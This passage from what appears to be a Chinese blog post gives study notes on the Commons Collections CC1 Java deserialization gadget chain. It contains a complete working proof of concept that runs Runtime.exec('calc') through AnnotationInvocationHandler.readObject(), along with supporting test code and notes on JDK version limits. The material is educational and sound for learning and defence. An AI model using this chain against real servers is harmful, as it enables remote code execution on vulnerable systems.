class="string">&quot;value2&quot;</span>);</span><br><span class="line">        printMap(innerMap);</span><br><span class="line">        printMap(outerMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokerTransformerTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;));</span><br><span class="line">        <span class="comment">// 这里的exec是Runtime.getRuntime()上调用的，可以去看看TransformedMap里的put()方法，Class[]是参数类型，Object[]是参数本身</span></span><br><span class="line">        outerMap.put(<span class="string">&quot;key1&quot;</span>,Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">chainedTransformerTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 这里也可以反过来调用</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)&#125;));</span><br><span class="line">        outerMap.put(<span class="string">&quot;key1&quot;</span>,Runtime.getRuntime());</span><br><span class="line">        printMap(innerMap);</span><br><span class="line">        printMap(outerMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// transformedMapTest();</span></span><br><span class="line">        <span class="comment">// constantTransformerTest();</span></span><br><span class="line">        <span class="comment">// invokerTransformerTest();</span></span><br><span class="line">        <span class="comment">// chainedTransformerTest();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 想要对键值对进行的操作</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KeyTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span>  Object <span class="title function_">transform</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;KeyTransformer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello key&quot;</span>; <span class="comment">// 或者是单纯的hello key</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ValueTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span>  Object <span class="title function_">transform</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ValueTransformer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello value&quot;</span>;   <span class="comment">// 或者是单纯的hello value</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="正轨-CC1分析"><a href="#正轨-CC1分析" class="headerlink" title="正轨: CC1分析"></a>正轨: CC1分析</h2><h3 id="触发点-sun-reflect-annotation-AnnotationInvocationHandle-readObject"><a href="#触发点-sun-reflect-annotation-AnnotationInvocationHandle-readObject" class="headerlink" title="触发点: sun.reflect.annotation.AnnotationInvocationHandle.readObject()"></a>触发点: sun.reflect.annotation.AnnotationInvocationHandle.readObject()</h3><blockquote><p>在上面的命令执行中，最终我们是手动的执行了put()方法来实现了漏洞的触发。在反序列化中，<em><strong>我们需要找到一个可以用的类的readObject()方法</strong></em>，通过这个方法最终可以触发漏洞</p></blockquote><ol><li><p>sun.reflect.annotation.AnnotationInvocationHandle.readObject()</p><ol><li>注意到其中调用了var5.setValue()，var5 -&gt; var4 -&gt; this.memberValues，于是加上前面的部分</li><li>这下好了，在var2处传入我们使用<code>TransformedMap</code>构造的命令执行链，就可以实现在<code>readObject()</code>时通过<code>setValue()</code>进行调用</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...很多东西</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">       var1.defaultReadObject();</span><br><span class="line">       <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">       <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">           Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">           <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">           <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">           <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">               <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                   var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="CC1逐步构造poc"><a href="#CC1逐步构造poc" class="headerlink" title="CC1逐步构造poc"></a>CC1逐步构造poc</h3><h4 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h4><ol><li><p>分析完毕后，可以知道我们构造POC的时候，就需要创建一个AnnotationInvocationHandler对象，并将前面构造的HashMap设置进来</p></li><li><p><strong>尝试1:</strong> 因为 sun.reflect.annotation.AnnotationInvocationHandler 是在JDK内部的类(这里构造函数没有public，是default的私有的)，不能直接使用new来实例化，同时需要使用到的Runtime命令执行要怎么办？</p><ol><li>解决方法：<strong>使用反射进行获取并设置可达性(Runtime详见Q: 如何解决Runtime无法进行序列化)</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 仅仅是大体思路：构造AnnotationInvocationHandler对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure></li><li><p><strong>尝试2:</strong> 尝试1无法成功反序列化，细读readObject()中的细节 <strong>(详见Q: 为什么需要使用Retention.class)</strong></p><ol><li>解决方法：这里需要传入一个Rentention并且<code>innerMap.put(&quot;value&quot;,&quot;whaterver&quot;)</code></li></ol></li></ol><h4 id="Q-如何解决Runtime无法进行序列化"><a href="#Q-如何解决Runtime无法进行序列化" class="headerlink" title="Q: 如何解决Runtime无法进行序列化"></a>Q: 如何解决Runtime无法进行序列化</h4><blockquote><p>在序列化的时候会报无法序列化的错误。原因就在于Runtime类并没有实现Serializable接口，所以无法序列化</p></blockquote><ol><li><p>p牛的解决方法是: <strong>Class类有实现Serializable接口</strong>，可以进行序列化。那这里通过<strong>反射</strong>来获取到当前上下文中的Runtime对象，而不需要直接使用这个类，实现了从java.lang.Runtime对象到java.lang.Class对象的转变 –&gt; **传递Class对象，然后利用InvokerTransformer调用方法最终获取Runtime对象</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通反射写法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// cc利用反射写法</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="comment">// 这一个Transformers[]有整整的4个转换器</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),    <span class="comment">// Class对象可以进行反序列化</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></li></ol><h4 id="Q-什么是Annotation类-为什么需要使用Retention-class"><a href="#Q-什么是Annotation类-为什么需要使用Retention-class" class="headerlink" title="Q: 什么是Annotation类?为什么需要使用Retention.class?"></a>Q: 什么是Annotation类?为什么需要使用Retention.class?</h4><ol><li>见readObject()<ol><li><p>发现有var7!&#x3D;null -&gt; var3.get(var6) -&gt; var6 &#x3D; (String)var5.getKey(); var3 &#x3D; var2.memberTyes() -&gt; var2 &#x3D; null</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>还会涉及到Java注释相关的技术，p牛也不分析，只给出两个结论</p><ol><li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</li><li>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</li></ol></li><li><p>使用Retention: Retention有一个方法，名为value；所以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素<code>innerMap.put(&quot;value&quot;,&quot;whatever string&quot;);</code></p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="CC1最终poc"><a href="#CC1最终poc" class="headerlink" title="CC1最终poc"></a>CC1最终poc</h4><blockquote><p>p牛版本的poc，使用TransformedMap实现的</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 1. 构造payload * * * * * */</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">// 到这里才调用了getRuntime()获取了对应的对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;h3110 w0r1d&quot;</span>);    <span class="comment">// 这里选择value来解决刚好，因为key有限制，可以将值替换掉</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 反射获取sun.reflect.annotation.AnnotationInvocationHandler * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">                <span class="comment">// (Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2)</span></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class, outerMap);</span><br><span class="line">                <span class="comment">// Retention涉及到注解机制，这里先记下结论</span></span><br><span class="line">                <span class="comment">// outerMap是构造了的payload</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line">                <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            oos.close();</span><br><span class="line">                <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><blockquote><p>JDK8u71之前</p></blockquote><ol><li><em><strong>原因</strong></em><ol><li>在8u71以后大概是2015年12月的时候，Java官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数：<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d">查看变化</a></li><li>有些文章说是因为没有了setValue，其实原因和setValue关系不大。改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。所以，<strong>后续对Map的操作都是基于这个新的LinkedHashMap对象</strong>，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了</li></ol></li></ol><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap?"></a>LazyMap?</h3><ol><li><em><strong>关于LazyMap</strong></em><ol><li>ysoserial的代码没有用到TransformedMap，而是改用了LazyMap。这并不是是在解决CommonCollections1这个利用链在高版本Java中不可用的问题，即使使用LazyMap仍然无法在高版本的Java中使用这条利用链，主要原因还是出在sun.reflect.annotation.AnnotationInvocationHandler 这个类的修改上，不过我还没学</li><li>总结，后面再学</li></ol></li></ol><h2 id="后话-如何正确快速的分析一个程序-链子"><a href="#后话-如何正确快速的分析一个程序-链子" class="headerlink" title="*后话: 如何正确快速的分析一个程序&#x2F;链子"></a>*后话: 如何正确快速的分析一个程序&#x2F;链子</h2><ol><li>从应用入手</li><li>理解应用运行逻辑后再细读找出类逻辑 –&gt; 可以更好地抓住细节</li><li>从条件来说<ol><li>java是一种编译型语言，但是又拥有动态机制，<strong>静态编译时检查主要在于类型与语法，对于需要动态的内容只有运行到那里再结合异常机制才可以进行处理</strong>，这里可以确定我们最少需要的类型 –&gt; <strong>null也会看类型的，整体上应该说是xxx类型的变量被赋值为null</strong><ol><li><strong>反射（Reflection）</strong></li><li><strong>动态代理（Dynamic Proxies）</strong></li><li><strong>类加载器（Class Loaders）</strong></li><li>动态编译（Just-In-Time Compilation, JIT）: (CS61B中讲过)JVM包含一个JIT编译器，它可以在运行时将字节码编译成本地机器码，从而提高性能</li><li>脚本引擎（Scripting Engine）：Java SE 6及更高版本提供了javax.script包，支持在Java程序中嵌入脚本语言（如JavaScript、Groovy等）</li></ol></li><li>注解机制<ol><li>使用<code>@Nullable</code>和<code>@NonNull</code>注解本身不会直接进行检查，但它们可以与静态分析工具配合使用，以在编译时或开发过程中捕获潜在的 NullPointerException</li></ol></li></ol></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" 